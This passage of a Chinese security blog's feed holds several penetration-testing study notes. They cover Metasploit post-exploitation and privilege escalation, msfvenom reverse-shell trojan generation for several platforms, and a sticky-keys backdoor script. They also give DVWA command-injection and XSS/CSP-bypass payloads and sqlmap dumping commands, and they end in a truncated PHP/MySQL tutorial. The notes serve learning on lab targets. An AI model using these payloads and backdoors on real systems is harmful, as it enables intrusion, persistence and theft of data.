会发现3389端口未打开</code></pre><p><strong>开启远程桌面(3389)</strong></p><pre class=" language-Linux"><code class="language-Linux">run post/windows/manage/enable_rdp   # 开启远程桌面run getgui -e    # 开启远程桌面（不太靠谱）run getgui -u 用户名 -p 密码    run getgui -e -f 8888    # 开启远程桌面并且绑定在8888端口上</code></pre><p>指定端口：</p><p><img src="/2022/03/23/fire-wall/image-20220110183822328.png" alt="image-20220110183822328"></p><p><strong>kali图形界面上使用远程桌面</strong></p><pre class=" language-Linux"><code class="language-Linux">rdesktop -u [用户名] -p [密码] [目标ip]</code></pre><p><strong>关于截图</strong>：</p><p>msf</p><pre class=" language-Linux"><code class="language-Linux">load espia  # 加载截图插件screengrab   # 截图</code></pre><h2 id="后门植入："><a href="#后门植入：" class="headerlink" title="后门植入："></a>后门植入：</h2><p>之前新建的木马可以通过结束进程后放入回收站，即可删除木马。</p><p><code>meterpreter shell</code> 运行是在内存中的，重启即消失。</p><p>所以需要植入后门。</p><p>如果拿到了对方的powershell权限，那么可以做：</p><ol><li><p>卸载对方的补丁</p></li><li><p>给对方安装一些有漏洞的软件（比如说ftp程序，输入法等等）然后打开浏览器访问即可打开文件夹</p><p>考虑粘滞键漏洞：</p><pre class=" language-Linux"><code class="language-Linux">粘滞键地址在c:\windows\system32\sethc</code></pre><p>按5下shift键，即可召唤出来。</p><p>桌面新建一个x.bat</p><pre class=" language-Linux"><code class="language-Linux">takeown /f c:\windows\system32\sethc.* /a /r /d y  # 获得其控制权cacls c:\windows\system32\sethc.exe /T /E /G system:F  # 修改控制权cacls c:\windows\system32\sethc.exe /T /E /G administrator:F# 修改控制权copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe /y# 替换sethc</code></pre><p>按5下shift键，即可召唤出修改后的cmd</p><p>可在未登录下召唤出来，然后得到密码</p><p>普通状态是登录者的权限，如果是要登录的状态召唤出漏洞就是system权限</p></li></ol><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> windows </tag>
            
            <tag> 防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统权限及信息采集</title>
      <link href="/2022/03/23/system-passwd/"/>
      <url>/2022/03/23/system-passwd/</url>
      
        <content type="html"><![CDATA[<h1 id="操作系统权限及信息采集"><a href="#操作系统权限及信息采集" class="headerlink" title="操作系统权限及信息采集"></a>操作系统权限及信息采集</h1><h2 id="系统权限"><a href="#系统权限" class="headerlink" title="系统权限"></a>系统权限</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>system<br>administrator<br>(others)</p><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>root<br>(others)</p><h2 id="计算机组成相关权限"><a href="#计算机组成相关权限" class="headerlink" title="计算机组成相关权限"></a>计算机组成相关权限</h2><p><strong>CPU:</strong><br><strong>OS</strong>（操作系统——可以在其身上安装其他软件的软件，需要配合硬件）<br><strong>ring0</strong> 权限（驱动程序）——需要学习windows ddk<br><strong>ring3</strong> 权限（大多数软件）</p><p><strong>usb接口</strong>（硬件）</p><p><strong>硬件编程</strong></p><h2 id="操作系统提权："><a href="#操作系统提权：" class="headerlink" title="操作系统提权："></a>操作系统提权：</h2><p>msf：</p><pre class=" language-Linux"><code class="language-Linux">ms14_058,ms16_016# 目标x32位系统use exploit/windows/local/ms14_058...show optionsset session 1exploit# 如果使用成功会返回一个新的session号</code></pre><p>较出名漏洞：</p><p>cve<br>cnnvd</p><p>……</p><p><img src="/2022/03/23/system-passwd/image-20220109234619923.png" alt="image-20220109234619923"></p><h2 id="目标信息采集："><a href="#目标信息采集：" class="headerlink" title="目标信息采集："></a>目标信息采集：</h2><p>msf</p><p>需要进入到一个sessions里</p><pre class=" language-Linux"><code class="language-Linux">run post/windows/gather/forensics/xxxxx  # 取证模块run post/windows/gather/checkvm   # 检测是否为虚拟机run post/windows/gather/enum_services   # 查看运行的服务run post/windows/gather/enum_applications   # 查看电脑安装了哪些应用run post/windows/gather/enum_shares    # 查看共享run post/windows/gather/dumplinks   # 查看最近操作（安装东西）run post/windows/gather/enum_patches   # 查看用户安装了哪些补丁</code></pre><pre class=" language-Linux"><code class="language-Linux">cd /usr/share/metasploit-framework/scripts/resource/   #可以看到大佬的脚本</code></pre><pre class=" language-Linux"><code class="language-Linux">run scraper   # 导出所有信息run winenum   # 搜集系统环境变量</code></pre><h2 id="数据包you-get捕获："><a href="#数据包you-get捕获：" class="headerlink" title="数据包you-get捕获："></a>数据包you-get捕获：</h2><p>流媒体，很难搞<br>安装python环境</p><pre class=" language-Linux"><code class="language-Linux">pip install -i https://pypi.doubanio.com/simple you-getyou-get -i [视频地址]看到视频所有支持的格式按照提示去下载视频</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/04/21/docker/">ubuntu搭建docker环境</a></li><li><a href="http://broken-year.github.io/2022/04/15/Linux-Basics/">Linux基础</a></li><li><a href="http://broken-year.github.io/2022/03/21/Linux-system/">渗透测试系统加渗透工具</a></li><li><a href="https://chengzhaoxi.xyz/361d7ede.html">互联网算法工程开发常用技术</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 操作系统 </tag>
            
            <tag> Windows </tag>
            
            <tag> 安全 </tag>
            
            <tag> 权限 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF框架以及使用</title>
      <link href="/2022/03/23/msf/"/>
      <url>/2022/03/23/msf/</url>
      
        <content type="html"><![CDATA[<h1 id="MSF框架以及使用"><a href="#MSF框架以及使用" class="headerlink" title="MSF框架以及使用"></a>MSF框架以及使用</h1><pre class=" language-Linux"><code class="language-Linux">msfconsole //打开msf</code></pre><blockquote><p>在msf里可以使用别的工具，比如nmap</p></blockquote><pre class=" language-Linux"><code class="language-Linux">nmap -sV [ip]  //扫描一下</code></pre><p>msf如果攻击对方需要条件：</p><p>1.要有漏洞</p><p>2.攻击载荷</p><h2 id="ms17010"><a href="#ms17010" class="headerlink" title="ms17010"></a>ms17010</h2><pre class=" language-Linux"><code class="language-Linux">use exploit/windows/smb/ms17_010_eternalblue  //使用永恒之蓝漏洞show options   //查看需要的选项set RHOST [目标ip]run   //运行</code></pre><h2 id="msf内网渗透"><a href="#msf内网渗透" class="headerlink" title="msf内网渗透"></a>msf内网渗透</h2><p>生成exe木马</p><pre class=" language-Linux"><code class="language-Linux">在/root目录底下msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp LHOST=[本地ip] LPORT=[本地端口] -b "\00" -e x86/shikata_ga_nai -f exe >msf.exe</code></pre><blockquote><p>生成好之后下载到靶机</p></blockquote><p>在msf里建立木马的控制端</p><pre class=" language-Linux"><code class="language-Linux">msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset LHOST [本机ip]exploit  //进入监听状态background //暂时不操作，把木马放到后台sessions //查看控制多少人sessions -i 1 //进入1号主机的控制端jobs //查看目前在执行多少个任务back  //后退一格</code></pre><p>当目标运行木马，在控制端就会上线</p><h2 id="生成其他木马的命令"><a href="#生成其他木马的命令" class="headerlink" title="生成其他木马的命令"></a>生成其他木马的命令</h2><p>生成mac木马：</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=自己ip LPORT=4444 -f macho -o payload.macho# 老版本的mac</code></pre><p>生成android木马（需要数字签名）：</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f apk -o payload.apk</code></pre><p>生成powershell木马：</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=自己ip LPORT=4444 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1</code></pre><p>生成linux木马：</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f elf -o payload.elf</code></pre><p>生成python木马：</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -p python/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f raw -o payload.py</code></pre><h2 id="meterpreter操作"><a href="#meterpreter操作" class="headerlink" title="meterpreter操作:"></a>meterpreter操作:</h2><p>首先进入对方电脑</p><h3 id="UAC提权"><a href="#UAC提权" class="headerlink" title="UAC提权"></a>UAC提权</h3><pre class=" language-Linux"><code class="language-Linux">getuid   //查看当前用户权限getsystem //直接提权（有风险的）考虑使用ask模块提权background 把木马放到后台use exploit/windows/local/ask   //加载ask模块info  查看信息set SESSION 1 使用漏洞在1号木马控制的目标上set FILENAME qq.exe  伪装成qqset LHOST [本机ip]exploit会在用户桌面上弹出一个允许qq启动，用户选择yes成功getuid发现不是systemgetsystem提高到最高</code></pre><p>UAC权限</p><p><img src="/2022/03/23/msf/image-20220109231015448.png" alt="image-20220109231015448"></p><h3 id="UAC绕过提权-成功率不高"><a href="#UAC绕过提权-成功率不高" class="headerlink" title="UAC绕过提权(成功率不高)"></a>UAC绕过提权(成功率不高)</h3><pre class=" language-Linux"><code class="language-Linux">use exploit/windows/local/bypassuac # (多用来进攻32位系统)show optionsset SESSION 1exploit 开始攻击# 如果攻击成功，会给你一个新的session号# 进入新的session号getuidgetsystem</code></pre><h2 id="github"><a href="#github" class="headerlink" title="github"></a>github</h2><p>胖老鼠，后门    </p><p><a href="https://github.com/Screetsec/TheFatRat">https://github.com/Screetsec/TheFatRat</a></p><p>安卓payload</p><p><a href="https://github.com/M4sc3r4n0/Evil-Droid">https://github.com/M4sc3r4n0/Evil-Droid</a></p><p><a href="https://github.com/jbreed/apkinjector">https://github.com/jbreed/apkinjector</a></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/03/31/domain-security/">域内安全</a></li><li><a href="http://broken-year.github.io/2022/03/24/back-door/">系统后门</a></li><li><a href="http://broken-year.github.io/2022/03/23/web-vulnerability/">web漏洞介绍</a></li><li><a href="https://blogs.kainy.cn/2010/03/加密QQ空间强行爆破工具V1.0/">加密QQ空间强行爆破工具V1.0</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msf </tag>
            
            <tag> 工具 </tag>
            
            <tag> kali </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web漏洞介绍</title>
      <link href="/2022/03/23/web-vulnerability/"/>
      <url>/2022/03/23/web-vulnerability/</url>
      
        <content type="html"><![CDATA[<h1 id="其他web漏洞介绍"><a href="#其他web漏洞介绍" class="headerlink" title="其他web漏洞介绍"></a>其他web漏洞介绍</h1><h1 id="靶场DVWA"><a href="#靶场DVWA" class="headerlink" title="靶场DVWA"></a>靶场DVWA</h1><p>网上下载自己部署就好了</p><h3 id="Brute-Force暴力破解"><a href="#Brute-Force暴力破解" class="headerlink" title="Brute Force暴力破解"></a>Brute Force暴力破解</h3><p><strong>可以仔细观察密码输入错误和正确的页面返回大小是不一样的</strong></p><p>使用burp抓包，send to intruder，调整相应参数后进行攻击。</p><p><img src="/2022/03/23/web-vulnerability/image-20220109214045696.png" alt="image-20220109214045696"></p><p><img src="/2022/03/23/web-vulnerability/image-20220109214130442.png" alt="image-20220109214130442"></p><p><img src="/2022/03/23/web-vulnerability/image-20220109214224728.png" alt="image-20220109214224728"></p><p><img src="/2022/03/23/web-vulnerability/image-20220109214521397.png" alt="image-20220109214521397"></p><p><strong>sinper模式</strong></p><p>单向爆破<br>用途：你知道用户名不知道密码，破解一些单一输入框</p><p><strong>battering ram模式：</strong></p><p>并发攻击，对多个目标进行单一的payload攻击<br>也就是用户名和密码一样的情况（工号，学号）</p><p><strong>pitchform模式：</strong></p><p>交叉攻击（撞库）<br>有几个变量就可以选择几个字典，在这几个字典里随机抽出来尝试密码</p><p><strong>cluster bomb模式：</strong></p><p>穷举模式<br>完整的爆破</p><p><strong>高级别暴力破解例子：验证码？</strong></p><p>1.使用打码平台</p><p>2.人工智能（机器学习，深度学习，神经网络）</p><h2 id="Command-Injection（命令执行漏洞）"><a href="#Command-Injection（命令执行漏洞）" class="headerlink" title="Command Injection（命令执行漏洞）"></a>Command Injection（命令执行漏洞）</h2><p>一个地方可以执行操作系统的命令</p><pre class=" language-Linux"><code class="language-Linux">#通过源代码查看，然后得到可以操作ping命令输入框里输入127.0.0.1&cat /etc/passwd实际得到：ping 127.0.0.1&cat /etc/passwd  #几乎同时执行ping 127.0.0.1&&cat /etc/passwd  #执行完左边执行右边ping 127.0.0.1|cat /etc/passwd  #只执行右边的命令</code></pre><h2 id="SQL-Injection（sql注入攻击）"><a href="#SQL-Injection（sql注入攻击）" class="headerlink" title="SQL Injection（sql注入攻击）"></a>SQL Injection（sql注入攻击）</h2><p>medium<br>POST提交<br>burp抓包<br>右键-send to repeater</p><h2 id="Stored-Cross-Site-Scripting-XSS-存储型跨站脚本攻击"><a href="#Stored-Cross-Site-Scripting-XSS-存储型跨站脚本攻击" class="headerlink" title="Stored Cross Site Scripting (XSS)存储型跨站脚本攻击"></a>Stored Cross Site Scripting (XSS)存储型跨站脚本攻击</h2><pre class=" language-css"><code class="language-css">haha&lt;script><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'nihao'</span><span class="token punctuation">)</span>&lt;/script># 替换了&lt;script>为空# 转义了' "haha&lt;scr&lt;script>ipt><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>&lt;/script># 前端代码是不识别script标签大小写的haha&lt;scRiPt><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>&lt;/sCRipt># 图片无法加载也可以触发js&lt;img src=<span class="token string">'x'</span> onerror=<span class="token string">'alert(1)'</span>/>## 配合burpsuite神器使用</code></pre><p>见CTF-初识XSS</p><h2 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass</h2><p>浏览器安全策略【验证合法性的来源】</p><p>对xss有防护作用的——所以<strong>需要看源代码以突破防护</strong></p><p>只允许执行某些网站的东西，那你就到这个网站上想办法写一个js的地址</p><p><a href="https://pastebin.com/">https://pastebin.com/</a></p><h3 id="medium："><a href="#medium：" class="headerlink" title="medium："></a><strong>medium</strong>：</h3><p>unsafe-inline   #允许使用内联资源 比如：javascript:xxx.com  onclick  style<br>nonce-source  #允许特定内联模块 比如：nonce&#x3D;”TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA&#x3D;”</p><p>因此可以：</p><pre class=" language-css"><code class="language-css">&lt;script nonce=<span class="token string">"TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA="</span>><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'haha'</span><span class="token punctuation">)</span>&lt;/script></code></pre><h2 id="JavaScript-Attacks"><a href="#JavaScript-Attacks" class="headerlink" title="JavaScript Attacks"></a>JavaScript Attacks</h2><p>js攻击——</p><p><strong>攻击web前端安全</strong></p><p><strong>需要知道token的算法是什么，看懂token算法的js代码，然后去推</strong></p><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>在控制台输入<br>md5(rot13(“success”));<br>得到token</p><p><img src="/2022/03/23/web-vulnerability/image-20220109222426153.png" alt="image-20220109222426153"></p><p>然后替换</p><h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p>查看源代码</p><p>然后百度搜索js代码格式化：查看js内容</p><p>XXsuccessXX</p><p>然后翻转</p><p>得到XXsseccusXX</p><p>更改token</p><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>解密特征混淆算法的网站<br><a href="http://deobfuscatejavascript.com/">http://deobfuscatejavascript.com/</a></p><p>解密得到js代码内容</p><p><img src="/2022/03/23/web-vulnerability/image-20220109222926778.png" alt="image-20220109222926778"></p><p>控制台，输入得到的js所有代码运行一下</p><p>然后进行推算、运行、复制、提交</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2017/09/让webapp的UI体验更接近原生的小技巧/">让webapp的UI体验更接近原生的小技巧</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入工具的使用</title>
      <link href="/2022/03/23/sql-gjsy/"/>
      <url>/2022/03/23/sql-gjsy/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入工具的使用"><a href="#SQL注入工具的使用" class="headerlink" title="SQL注入工具的使用"></a>SQL注入工具的使用</h1><h2 id="网站的一些组合"><a href="#网站的一些组合" class="headerlink" title="网站的一些组合"></a>网站的一些组合</h2><p>windows+iis（网站服务器）+asp&#x2F;aspx(asp.net)+access&#x2F;mssql【企业内部使用概率大】【打下来是普通用户权限】<br>windows+apache+php+mysql&#x3D; wamp（一般使用软件进行集成化搭建)【老版本PHPadmin有漏洞】【打下来是普通用户权限】</p><p>linux+apache&#x2F;nginx+php+mysql &#x3D; lamp&#x2F;lnmp（有可能使用宝塔或者其他面板搭建）【使用较多】【打下来是网站管理的权限】</p><p>linux+tomcat+java(jsp)+oracle&#x2F;mysql 【打下来是root权限】</p><p>linux+nginx+python(django&#x2F;flask)+mysql【新】</p><h2 id="pangolin（穿山甲）"><a href="#pangolin（穿山甲）" class="headerlink" title="pangolin（穿山甲）"></a>pangolin（穿山甲）</h2><blockquote><p>穿山甲作为老牌的SQL注入工具，在注入方面支持多种提交方式，是在手动发现注入点之后，一款比较好用的注入工具。</p></blockquote><p><img src="/2022/03/23/sql-gjsy/image-20220323111431072.png" alt="image-20220323111431072"></p><blockquote><p>查看基本信息</p></blockquote><p><img src="/2022/03/23/sql-gjsy/image-20220323111809951.png" alt="image-20220323111809951"></p><blockquote><p>查看表和数据</p></blockquote><p><img src="/2022/03/23/sql-gjsy/image-20220323111935479.png" alt="image-20220323111935479"></p><h2 id="havij（萝卜头）"><a href="#havij（萝卜头）" class="headerlink" title="havij（萝卜头）"></a>havij（萝卜头）</h2><p><img src="/2022/03/23/sql-gjsy/image-20220323115533965.png" alt="image-20220323115533965"></p><h2 id="sqlmap（sql注入神器）"><a href="#sqlmap（sql注入神器）" class="headerlink" title="sqlmap（sql注入神器）"></a>sqlmap（sql注入神器）</h2><h3 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h3><pre class=" language-Linux"><code class="language-Linux">sqlmap -u [目标url] --dbs  //获取目标网站数据库库名sqlmap -u [目标url] -D security --tables //获取库里的表sqlmap -u [目标url] -D security -T users columns //发现id，username，passwordsqlmap -u [目标url] -D security -T users -C username,password --dump //找到数据完整版命令sqlmap -u [目标url] dbs batch threads 10 technique U使用sqlmap10线程，忽略错误，使用union select注入网站</code></pre><h3 id="报错注入（error-based）"><a href="#报错注入（error-based）" class="headerlink" title="报错注入（error based）"></a>报错注入（error based）</h3><blockquote><p>无法发现报错位，但是数据库错了会显示出来</p></blockquote><pre class=" language-Linux"><code class="language-Linux">sqlmap -u http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1 --current-db --batch --threads 10 --technique E</code></pre><h3 id="布尔型注入（booled-based）"><a href="#布尔型注入（booled-based）" class="headerlink" title="布尔型注入（booled based）"></a>布尔型注入（booled based）</h3><blockquote><p>无法发现报错位，数据库被破坏也无法爆出来，但是界面上会出现有和没有东西两种情况</p></blockquote><pre class=" language-Linux"><code class="language-Linux">sqlmap -u http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1 --current-db --batch --threads 10 --technique B</code></pre><h3 id="时间盲注（time-based）"><a href="#时间盲注（time-based）" class="headerlink" title="时间盲注（time based）"></a>时间盲注（time based）</h3><blockquote><p>无法发现报错位，数据库被破坏也无法爆出来，界面上也没有出现或者消失东西的现象</p></blockquote><pre class=" language-Linux"><code class="language-Linux">sqlmap -u http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1 --current-db --batch --threads 10 --technique T</code></pre><h3 id="POST方面注入"><a href="#POST方面注入" class="headerlink" title="POST方面注入"></a>POST方面注入</h3><pre class=" language-php"><code class="language-php"><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'unmae'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>select username<span class="token punctuation">,</span>password from users where username<span class="token operator">=</span><span class="token string">'$uname'</span> <span class="token keyword">and</span> password<span class="token operator">=</span><span class="token string">'$passwd'</span> limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span></code></pre><pre class=" language-Linux"><code class="language-Linux">sqlmap -u http://sqlilabs.njhack.xyz/Less-11/ --data "uname=admin*&passwd=admin&submit=Submit" --current-db --batch --threads 10 --technique E--data 后面跟的是post的数据【用purbsuite抓包得到】*号标哪，就是让sqlmap打哪</code></pre><p><strong>有的网站可能会搜集用户的浏览器信息：</strong></p><h3 id="请求头注入"><a href="#请求头注入" class="headerlink" title="请求头注入"></a>请求头注入</h3><pre class=" language-Linux"><code class="language-Linux">ip地址，user-agent（浏览器信息）,referer（来路）,cookiesqlmap -u http://sqlilabs.njhack.xyz/Less-18/ --user-agent="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0*" --level 4 --dbs --threads 10 --batch --technique E# 在使用请求头注入的时候，--level必须大于3# *号标哪，就是让sqlmap打哪sqlmap -u http://sqlilabs.njhack.xyz/Less-20/ --cookie="uname = admin*;__cfduid=dab97c3dd6a54c5ca485d3e880af5ce271605180690" --level 4 --dbs --threads 10 --batch --technique E# cookie=？【用purbsuite抓包得到】# *号标哪，就是让sqlmap打哪</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2017/09/让webapp的UI体验更接近原生的小技巧/">让webapp的UI体验更接近原生的小技巧</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> web </tag>
            
            <tag> sql </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php和数据库</title>
      <link href="/2022/03/22/php-sql/"/>
      <url>/2022/03/22/php-sql/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP文本连接数据库"><a href="#PHP文本连接数据库" class="headerlink" title="PHP文本连接数据库"></a>PHP文本连接数据库</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><blockquote><p>首先要打开mysql服务以及apache服务</p><p>在网页中输入127.0.0.1&#x2F;phpmyadmin进入mysql图形化管理界面</p><p>新加一个名叫test的库，库里table1表，表里有id，username，password三个字段</p></blockquote><p><img src="/2022/03/22/php-sql/image-20220322200840920.png" alt="image-20220322200840920"></p><h2 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h2><blockquote><p>在www目录下新建一个php，开始php连接数据库</p></blockquote><pre class=" language-PHP"><code class="language-PHP"><?php$servername = "localhost";$username = "root";$password = "root";$dbname = "test";//创建连接$conn = new mysqli($servername,$username,$password,$dbname);//检测连接if($conn->connect_error)&#123;    die("error".$conn->connect_error);&#125;echo "success";?></code></pre><h2 id="数据库增删改查"><a href="#数据库增删改查" class="headerlink" title="数据库增删改查"></a>数据库增删改查</h2><blockquote><p>准备一条数据库语句，然后执行，最后输出结果</p></blockquote><p><strong>查</strong></p><pre class=" language-PHP"><code class="language-PHP">//查找语句,查找table1里id<3的数据$sql = "SELECT * FROM table1 WHERE id < 3";//执行sql语句，并且返回给变量$result$result = $conn->query($sql);//条件语句，如果$result不为空if ($result->num_rows > 0)&#123;        //输出数据,fetch_accos()从结果集中取出一行作为关联数组    while ($row=$result->fetch_assoc()) &#123;        echo $row['id'].'------'.$row['username'].'------'.$row['password']."<br/>";    &#125;&#125;else&#123;    echo "0 结果";&#125;?></code></pre><p><strong>增</strong></p><pre class=" language-PHP"><code class="language-PHP">//插入数据$sql = "INSERT INTO table1 (id,username,password) VALUES(4,'haha','123456')";//===代表全等于 ==必须要求两边数据类型一致，否则会强制类型转换if($conn->query($sql)===TRUE)&#123;    echo "success";&#125;else&#123;    echo "error:".$conn->error;&#125;</code></pre><p><strong>删</strong></p><pre class=" language-PHP"><code class="language-PHP">$sql = "DELETE FROM table1 WHERE username='haha'";if($conn->query($sql)===TRUE)&#123;    echo "success";&#125;else&#123;    echo "error:".$conn->error;&#125;</code></pre><p><strong>改</strong></p><pre class=" language-PHP"><code class="language-PHP">$sql = "UPDATE table1 SET password='niu' WHERE username='xm'";if($conn->query($sql)===TRUE)&#123;    echo "success";&#125;else&#123;    echo "error:".$conn->error;&#125;</code></pre><h2 id="html和PHP结合起来美化网页"><a href="#html和PHP结合起来美化网页" class="headerlink" title="html和PHP结合起来美化网页"></a>html和PHP结合起来美化网页</h2><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span> db test <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span> <span class="token delimiter">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string">"test"</span><span class="token punctuation">;</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">.</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM table1 WHERE id &lt; 4"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token 